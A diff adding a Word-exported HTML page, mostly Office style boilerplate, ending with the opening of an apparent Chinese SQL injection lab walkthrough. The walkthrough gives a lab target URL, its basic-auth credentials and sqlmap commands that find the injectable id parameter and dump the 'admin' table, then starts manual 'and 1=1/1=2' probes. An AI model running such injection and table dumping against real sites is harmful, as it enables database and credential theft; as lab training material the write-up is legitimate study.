+  <w:LsdException Locked="false" Priority="45" Name="Plain Table 5"/>
+  <w:LsdException Locked="false" Priority="40" Name="Grid Table Light"/>
+  <w:LsdException Locked="false" Priority="46" Name="Grid Table 1 Light"/>
+  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2"/>
+  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3"/>
+  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4"/>
+  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark"/>
+  <w:LsdException Locked="false" Priority="51" Name="Grid Table 6 Colorful"/>
+  <w:LsdException Locked="false" Priority="52" Name="Grid Table 7 Colorful"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="Grid Table 1 Light Accent 1"/>
+  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 1"/>
+  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 1"/>
+  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 1"/>
+  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 1"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="Grid Table 6 Colorful Accent 1"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="Grid Table 7 Colorful Accent 1"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="Grid Table 1 Light Accent 2"/>
+  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 2"/>
+  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 2"/>
+  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 2"/>
+  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 2"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="Grid Table 6 Colorful Accent 2"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="Grid Table 7 Colorful Accent 2"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="Grid Table 1 Light Accent 3"/>
+  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 3"/>
+  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 3"/>
+  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 3"/>
+  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 3"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="Grid Table 6 Colorful Accent 3"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="Grid Table 7 Colorful Accent 3"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="Grid Table 1 Light Accent 4"/>
+  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 4"/>
+  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 4"/>
+  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 4"/>
+  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 4"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="Grid Table 6 Colorful Accent 4"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="Grid Table 7 Colorful Accent 4"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="Grid Table 1 Light Accent 5"/>
+  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 5"/>
+  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 5"/>
+  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 5"/>
+  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 5"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="Grid Table 6 Colorful Accent 5"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="Grid Table 7 Colorful Accent 5"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="Grid Table 1 Light Accent 6"/>
+  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 6"/>
+  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 6"/>
+  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 6"/>
+  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 6"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="Grid Table 6 Colorful Accent 6"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="Grid Table 7 Colorful Accent 6"/>
+  <w:LsdException Locked="false" Priority="46" Name="List Table 1 Light"/>
+  <w:LsdException Locked="false" Priority="47" Name="List Table 2"/>
+  <w:LsdException Locked="false" Priority="48" Name="List Table 3"/>
+  <w:LsdException Locked="false" Priority="49" Name="List Table 4"/>
+  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark"/>
+  <w:LsdException Locked="false" Priority="51" Name="List Table 6 Colorful"/>
+  <w:LsdException Locked="false" Priority="52" Name="List Table 7 Colorful"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="List Table 1 Light Accent 1"/>
+  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 1"/>
+  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 1"/>
+  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 1"/>
+  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 1"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="List Table 6 Colorful Accent 1"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="List Table 7 Colorful Accent 1"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="List Table 1 Light Accent 2"/>
+  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 2"/>
+  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 2"/>
+  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 2"/>
+  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 2"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="List Table 6 Colorful Accent 2"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="List Table 7 Colorful Accent 2"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="List Table 1 Light Accent 3"/>
+  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 3"/>
+  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 3"/>
+  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 3"/>
+  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 3"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="List Table 6 Colorful Accent 3"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="List Table 7 Colorful Accent 3"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="List Table 1 Light Accent 4"/>
+  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 4"/>
+  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 4"/>
+  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 4"/>
+  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 4"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="List Table 6 Colorful Accent 4"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="List Table 7 Colorful Accent 4"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="List Table 1 Light Accent 5"/>
+  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 5"/>
+  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 5"/>
+  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 5"/>
+  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 5"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="List Table 6 Colorful Accent 5"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="List Table 7 Colorful Accent 5"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="List Table 1 Light Accent 6"/>
+  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 6"/>
+  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 6"/>
+  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 6"/>
+  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 6"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="List Table 6 Colorful Accent 6"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="List Table 7 Colorful Accent 6"/>
+ </w:LatentStyles>
+</xml><![endif]-->
+<style>
+<!--
+ /* Font Definitions */
+ @font-face
+	{font-family:宋体;
+	panose-1:2 1 6 0 3 1 1 1 1 1;
+	mso-font-alt:SimSun;
+	mso-font-charset:134;
+	mso-generic-font-family:auto;
+	mso-font-pitch:variable;
+	mso-font-signature:515 680460288 22 0 262145 0;}
+@font-face
+	{font-family:"Cambria Math";
+	panose-1:2 4 5 3 5 4 6 3 2 4;
+	mso-font-charset:1;
+	mso-generic-font-family:roman;
+	mso-font-format:other;
+	mso-font-pitch:variable;
+	mso-font-signature:0 0 0 0 0 0;}
+@font-face
+	{font-family:Calibri;
+	panose-1:2 15 5 2 2 2 4 3 2 4;
+	mso-font-charset:0;
+	mso-generic-font-family:swiss;
+	mso-font-pitch:variable;
+	mso-font-signature:-469750017 -1073732485 9 0 511 0;}
+@font-face
+	{font-family:Consolas;
+	panose-1:2 11 6 9 2 2 4 3 2 4;
+	mso-font-charset:0;
+	mso-generic-font-family:modern;
+	mso-font-pitch:fixed;
+	mso-font-signature:-536869121 64767 1 0 415 0;}
+@font-face
+	{font-family:"\@宋体";
+	panose-1:2 1 6 0 3 1 1 1 1 1;
+	mso-font-charset:134;
+	mso-generic-font-family:auto;
+	mso-font-pitch:variable;
+	mso-font-signature:515 680460288 22 0 262145 0;}
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-unhide:no;
+	mso-style-qformat:yes;
+	mso-style-parent:"";
+	margin:0cm;
+	margin-bottom:.0001pt;
+	text-align:justify;
+	text-justify:inter-ideograph;
+	mso-pagination:none;
+	font-size:10.5pt;
+	mso-bidi-font-size:11.0pt;
+	font-family:"Calibri",sans-serif;
+	mso-ascii-font-family:Calibri;
+	mso-ascii-theme-font:minor-latin;
+	mso-fareast-font-family:宋体;
+	mso-fareast-theme-font:minor-fareast;
+	mso-hansi-font-family:Calibri;
+	mso-hansi-theme-font:minor-latin;
+	mso-bidi-font-family:"Times New Roman";
+	mso-bidi-theme-font:minor-bidi;
+	mso-font-kerning:1.0pt;}
+a:link, span.MsoHyperlink
+	{mso-style-priority:99;
+	color:#0563C1;
+	mso-themecolor:hyperlink;
+	text-decoration:underline;
+	text-underline:single;}
+a:visited, span.MsoHyperlinkFollowed
+	{mso-style-noshow:yes;
+	mso-style-priority:99;
+	color:#954F72;
+	mso-themecolor:followedhyperlink;
+	text-decoration:underline;
+	text-underline:single;}
+code
+	{mso-style-noshow:yes;
+	mso-style-priority:99;
+	mso-ansi-font-size:12.0pt;
+	mso-bidi-font-size:12.0pt;
+	font-family:宋体;
+	mso-ascii-font-family:宋体;
+	mso-fareast-font-family:宋体;
+	mso-hansi-font-family:宋体;
+	mso-bidi-font-family:宋体;}
+pre
+	{mso-style-priority:99;
+	mso-style-link:"HTML 预设格式 Char";
+	margin:0cm;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:宋体;
+	mso-bidi-font-family:宋体;}
+span.HTMLChar
+	{mso-style-name:"HTML 预设格式 Char";
+	mso-style-priority:99;
+	mso-style-unhide:no;
+	mso-style-locked:yes;
+	mso-style-link:"HTML 预设格式";
+	mso-ansi-font-size:12.0pt;
+	mso-bidi-font-size:12.0pt;
+	font-family:宋体;
+	mso-ascii-font-family:宋体;
+	mso-fareast-font-family:宋体;
+	mso-hansi-font-family:宋体;
+	mso-bidi-font-family:宋体;
+	mso-font-kerning:0pt;}
+p.ne-p, li.ne-p, div.ne-p
+	{mso-style-name:ne-p;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:宋体;
+	mso-bidi-font-family:宋体;}
+span.ne-text
+	{mso-style-name:ne-text;
+	mso-style-unhide:no;}
+span.SpellE
+	{mso-style-name:"";
+	mso-spl-e:yes;}
+span.GramE
+	{mso-style-name:"";
+	mso-gram-e:yes;}
+.MsoChpDefault
+	{mso-style-type:export-only;
+	mso-default-props:yes;
+	font-family:"Calibri",sans-serif;
+	mso-bidi-font-family:"Times New Roman";
+	mso-bidi-theme-font:minor-bidi;}
+ /* Page Definitions */
+ @page
+	{mso-page-border-surround-header:no;
+	mso-page-border-surround-footer:no;}
+@page WordSection1
+	{size:595.3pt 841.9pt;
+	margin:72.0pt 90.0pt 72.0pt 90.0pt;
+	mso-header-margin:42.55pt;
+	mso-footer-margin:49.6pt;
+	mso-paper-source:0;
+	layout-grid:15.6pt;}
+div.WordSection1
+	{page:WordSection1;}
+-->
+</style>
+<!--[if gte mso 10]>
+<style>
+ /* Style Definitions */
+ table.MsoNormalTable
+	{mso-style-name:普通表格;
+	mso-tstyle-rowband-size:0;
+	mso-tstyle-colband-size:0;
+	mso-style-noshow:yes;
+	mso-style-priority:99;
+	mso-style-parent:"";
+	mso-padding-alt:0cm 5.4pt 0cm 5.4pt;
+	mso-para-margin:0cm;
+	mso-para-margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:10.5pt;
+	mso-bidi-font-size:11.0pt;
+	font-family:"Calibri",sans-serif;
+	mso-ascii-font-family:Calibri;
+	mso-ascii-theme-font:minor-latin;
+	mso-hansi-font-family:Calibri;
+	mso-hansi-theme-font:minor-latin;
+	mso-bidi-font-family:"Times New Roman";
+	mso-bidi-theme-font:minor-bidi;
+	mso-font-kerning:1.0pt;}
+</style>
+<![endif]--><!--[if gte mso 9]><xml>
+ <o:shapedefaults v:ext="edit" spidmax="1026"/>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <o:shapelayout v:ext="edit">
+  <o:idmap v:ext="edit" data="1"/>
+ </o:shapelayout></xml><![endif]-->
+</head>
+
+<body lang=ZH-CN link="#0563C1" vlink="#954F72" style='tab-interval:21.0pt;
+text-justify-trim:punctuation'>
+
+<div class=WordSection1 style='layout-grid:15.6pt'>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US>Tips:</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span
+style='font-family:宋体;mso-ascii-font-family:Calibri;mso-ascii-theme-font:minor-latin;
+mso-fareast-font-family:宋体;mso-fareast-theme-font:minor-fareast;mso-hansi-font-family:
+Calibri;mso-hansi-theme-font:minor-latin'>通过</span><span class=SpellE><span
+lang=EN-US>sql</span></span><span style='font-family:宋体;mso-ascii-font-family:
+Calibri;mso-ascii-theme-font:minor-latin;mso-fareast-font-family:宋体;mso-fareast-theme-font:
+minor-fareast;mso-hansi-font-family:Calibri;mso-hansi-theme-font:minor-latin'>注入拿到管理员密码！</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span
+style='font-family:宋体;mso-ascii-font-family:Calibri;mso-ascii-theme-font:minor-latin;
+mso-fareast-font-family:宋体;mso-fareast-theme-font:minor-fareast;mso-hansi-font-family:
+Calibri;mso-hansi-theme-font:minor-latin'>目标地址：</span><span class=MsoHyperlink><span
+lang=EN-US style='font-size:12.0pt;font-family:Consolas;mso-fareast-font-family:
+宋体;mso-bidi-font-family:宋体'><a href="http://pu2lh35z.ia.aqlab.cn/index.php?id=1">http://pu2lh35z.ia.aqlab.cn/index.php?id=1</a></span></span><code><span
+lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'><o:p></o:p></span></code></p>
+
+<p class=MsoNormal align=center style='text-align:center'><code><span
+lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'><o:p>&nbsp;</o:p></span></code></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shapetype id="_x0000_t75"
+ coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe"
+ filled="f" stroked="f">
+ <v:stroke joinstyle="miter"/>
+ <v:formulas>
+  <v:f eqn="if lineDrawn pixelLineWidth 0"/>
+  <v:f eqn="sum @0 1 0"/>
+  <v:f eqn="sum 0 0 @1"/>
+  <v:f eqn="prod @2 1 2"/>
+  <v:f eqn="prod @3 21600 pixelWidth"/>
+  <v:f eqn="prod @3 21600 pixelHeight"/>
+  <v:f eqn="sum @0 0 1"/>
+  <v:f eqn="prod @6 1 2"/>
+  <v:f eqn="prod @7 21600 pixelWidth"/>
+  <v:f eqn="sum @8 21600 0"/>
+  <v:f eqn="prod @7 21600 pixelHeight"/>
+  <v:f eqn="sum @10 21600 0"/>
+ </v:formulas>
+ <v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/>
+ <o:lock v:ext="edit" aspectratio="t"/>
+</v:shapetype><v:shape id="图片_x0020_1" o:spid="_x0000_i1044" type="#_x0000_t75"
+ style='width:415.5pt;height:3in;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image001.png" o:title=""/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=554 height=288
+src="SQL注入攻击原理%20实战演练.files/image002.jpg" v:shapes="图片_x0020_1"><![endif]></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span
+style='font-family:宋体;mso-ascii-font-family:Calibri;mso-ascii-theme-font:minor-latin;
+mso-fareast-font-family:宋体;mso-fareast-theme-font:minor-fareast;mso-hansi-font-family:
+Calibri;mso-hansi-theme-font:minor-latin'>前置限制：页面存在</span><strong><span
+lang=EN-US style='font-family:"Arial",sans-serif;color:black;font-weight:normal'>HTTP
+</span></strong><strong><span style='font-family:宋体;mso-ascii-font-family:Arial;
+mso-fareast-font-family:宋体;mso-fareast-theme-font:minor-fareast;mso-hansi-font-family:
+Arial;mso-bidi-font-family:Arial;color:black;font-weight:normal'>基础认证</span></strong><strong><span
+lang=EN-US style='font-family:"Arial",sans-serif;color:black;font-weight:normal'>
+401</span></strong><span style='font-family:宋体;mso-ascii-font-family:Calibri;
+mso-ascii-theme-font:minor-latin;mso-fareast-font-family:宋体;mso-fareast-theme-font:
+minor-fareast;mso-hansi-font-family:Calibri;mso-hansi-theme-font:minor-latin'>，账号：</span><span
+class=SpellE><code><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
+color:black'>zkaq</span></code></span><span style='font-family:宋体;mso-ascii-font-family:
+Calibri;mso-ascii-theme-font:minor-latin;mso-fareast-font-family:宋体;mso-fareast-theme-font:
+minor-fareast;mso-hansi-font-family:Calibri;mso-hansi-theme-font:minor-latin'>，密码：</span><span
+class=SpellE><span class=GramE><code><span lang=EN-US style='font-size:12.0pt;
+font-family:Consolas;color:black'>zkaq</span></code></span></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_2" o:spid="_x0000_i1043"
+ type="#_x0000_t75" style='width:272.25pt;height:219pt;visibility:visible;
+ mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image003.png" o:title=""/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=363 height=292
+src="SQL注入攻击原理%20实战演练.files/image003.png" v:shapes="图片_x0020_2"><![endif]></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span class=SpellE><span
+lang=EN-US>Sqlmap</span></span><span style='font-family:宋体;mso-ascii-font-family:
+Calibri;mso-ascii-theme-font:minor-latin;mso-fareast-font-family:宋体;mso-fareast-theme-font:
+minor-fareast;mso-hansi-font-family:Calibri;mso-hansi-theme-font:minor-latin'>探测</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center;line-height:18.0pt;
+mso-pagination:widow-orphan;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
+class=SpellE><span class=GramE><span lang=EN-US style='font-size:12.0pt;
+font-family:Consolas;mso-fareast-font-family:宋体;mso-bidi-font-family:宋体;
+color:black;mso-font-kerning:0pt'>sqlmap</span></span></span><span lang=EN-US
+style='font-size:12.0pt;font-family:Consolas;mso-fareast-font-family:宋体;
+mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt'> -u
+&quot;http://pu2lh35z.ia.aqlab.cn/<span class=SpellE>index.php?id</span>=1&quot;
+--<span class=SpellE>auth</span>-type=basic --<span class=SpellE>auth</span>-cred=<span
+class=SpellE>zkaq:zkaq</span> --batch<o:p></o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_3" o:spid="_x0000_i1042"
+ type="#_x0000_t75" style='width:415.5pt;height:510pt;visibility:visible;
+ mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image004.png" o:title=""/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=554 height=680
+src="SQL注入攻击原理%20实战演练.files/image005.jpg" v:shapes="图片_x0020_3"><![endif]></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span
+style='font-family:宋体;mso-ascii-font-family:Calibri;mso-ascii-theme-font:minor-latin;
+mso-fareast-font-family:宋体;mso-fareast-theme-font:minor-fareast;mso-hansi-font-family:
+Calibri;mso-hansi-theme-font:minor-latin'>出现</span> <span lang=EN-US>Parameter:
+*** </span><span style='font-family:宋体;mso-ascii-font-family:Calibri;
+mso-ascii-theme-font:minor-latin;mso-fareast-font-family:宋体;mso-fareast-theme-font:
+minor-fareast;mso-hansi-font-family:Calibri;mso-hansi-theme-font:minor-latin'>，</span><span
+lang=EN-US>get</span><span style='font-family:宋体;mso-ascii-font-family:Calibri;
+mso-ascii-theme-font:minor-latin;mso-fareast-font-family:宋体;mso-fareast-theme-font:
+minor-fareast;mso-hansi-font-family:Calibri;mso-hansi-theme-font:minor-latin'>参数</span><span
+lang=EN-US>ID</span><span style='font-family:宋体;mso-ascii-font-family:Calibri;
+mso-ascii-theme-font:minor-latin;mso-fareast-font-family:宋体;mso-fareast-theme-font:
+minor-fareast;mso-hansi-font-family:Calibri;mso-hansi-theme-font:minor-latin'>存在注入漏洞，</span><span
+lang=EN-US>ID</span><span style='font-family:宋体;mso-ascii-font-family:Calibri;
+mso-ascii-theme-font:minor-latin;mso-fareast-font-family:宋体;mso-fareast-theme-font:
+minor-fareast;mso-hansi-font-family:Calibri;mso-hansi-theme-font:minor-latin'>就是注入点</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span
+style='font-family:宋体;mso-ascii-font-family:Calibri;mso-ascii-theme-font:minor-latin;
+mso-fareast-font-family:宋体;mso-fareast-theme-font:minor-fareast;mso-hansi-font-family:
+Calibri;mso-hansi-theme-font:minor-latin'>指定业务库，列出库内所有表</span></p>
+
+<pre style='text-align:center;line-height:18.0pt'><span class=SpellE><span
+class=GramE><code><span lang=EN-US style='font-family:Consolas;color:black'>sqlmap</span></code></span></span><code><span
+lang=EN-US style='font-family:Consolas;color:black'> -u &quot;http://pu2lh35z.ia.aqlab.cn/?id=1&quot; --<span
+class=SpellE>auth</span>-type=basic --<span class=SpellE>auth</span>-cred=<span
+class=SpellE>zkaq:zkaq</span> --batch -D <span class=SpellE>maoshe</span> --tables</span></code><span
+lang=EN-US style='font-family:Consolas;color:black'><o:p></o:p></span></pre>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_4" o:spid="_x0000_i1041"
+ type="#_x0000_t75" style='width:414.75pt;height:263.25pt;visibility:visible;
+ mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image006.png" o:title=""/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=553 height=351
+src="SQL注入攻击原理%20实战演练.files/image007.jpg" v:shapes="图片_x0020_4"><![endif]></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span
+style='font-family:宋体;mso-ascii-font-family:Calibri;mso-ascii-theme-font:minor-latin;
+mso-fareast-font-family:宋体;mso-fareast-theme-font:minor-fareast;mso-hansi-font-family:
+Calibri;mso-hansi-theme-font:minor-latin'>对</span><span lang=EN-US>admin</span><span
+style='font-family:宋体;mso-ascii-font-family:Calibri;mso-ascii-theme-font:minor-latin;
+mso-fareast-font-family:宋体;mso-fareast-theme-font:minor-fareast;mso-hansi-font-family:
+Calibri;mso-hansi-theme-font:minor-latin'>进行脱库</span></p>
+
+<pre style='text-align:center;line-height:18.0pt'><span class=SpellE><span
+class=GramE><code><span lang=EN-US style='font-family:Consolas;color:black'>sqlmap</span></code></span></span><code><span
+lang=EN-US style='font-family:Consolas;color:black'> -u &quot;http://pu2lh35z.ia.aqlab.cn/?id=1&quot; --<span
+class=SpellE>auth</span>-type=basic --<span class=SpellE>auth</span>-cred=<span
+class=SpellE>zkaq:zkaq</span> --batch -D <span class=SpellE>maoshe</span> -T admin --dump<o:p></o:p></span></code></pre>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_5" o:spid="_x0000_i1040"
+ type="#_x0000_t75" style='width:415.5pt;height:283.5pt;visibility:visible;
+ mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image008.png" o:title=""/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=554 height=378
+src="SQL注入攻击原理%20实战演练.files/image009.jpg" v:shapes="图片_x0020_5"><![endif]></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span
+style='font-family:宋体;mso-ascii-font-family:Calibri;mso-ascii-theme-font:minor-latin;
+mso-fareast-font-family:宋体;mso-fareast-theme-font:minor-fareast;mso-hansi-font-family:
+Calibri;mso-hansi-theme-font:minor-latin'>结束！</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US><o:p>&nbsp;</o:p></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text><b><span style='font-size:18.0pt;color:#393939'>第一步，判断是否存在<span
+class=SpellE><span lang=EN-US>sql</span></span>注入漏洞</span></b></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text><span style='color:#393939'>构造<span lang=EN-US>
+?id=1 and 1=1 </span>，回车</span></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_7" o:spid="_x0000_i1039"
+ type="#_x0000_t75" alt="https://bbs.zkaq.cn/upload/userfile/814/31d0ce79e659d0d014a4a439e12e2743.png"
+ style='width:415.5pt;height:294pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image010.png" o:title="31d0ce79e659d0d014a4a439e12e2743"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=554 height=392
+src="SQL注入攻击原理%20实战演练.files/image011.png"
+alt="https://bbs.zkaq.cn/upload/userfile/814/31d0ce79e659d0d014a4a439e12e2743.png"
+v:shapes="图片_x0020_7"><![endif]></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>页面返回正常</span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>构造<span lang=EN-US> ?id=1 and 1=2 ,</span>回车</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_8" o:spid="_x0000_i1038"
+ type="#_x0000_t75" alt="https://bbs.zkaq.cn/upload/userfile/814/b8ff29703da272d177a51c63a4172d80.png"
+ style='width:415.5pt;height:286.5pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image012.png" o:title="b8ff29703da272d177a51c63a4172d80"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=554 height=382
+src="SQL注入攻击原理%20实战演练.files/image013.png"
+alt="https://bbs.zkaq.cn/upload/userfile/814/b8ff29703da272d177a51c63a4172d80.png"
+v:shapes="图片_x0020_8"><![endif]></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>页面不正常，初步判断这里 可能 存在一个注入漏洞</span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text><b><span style='font-size:18.0pt;color:#393939'>第二步<span
+lang=EN-US>:</span>判断字段数</span></b></span></p>
+
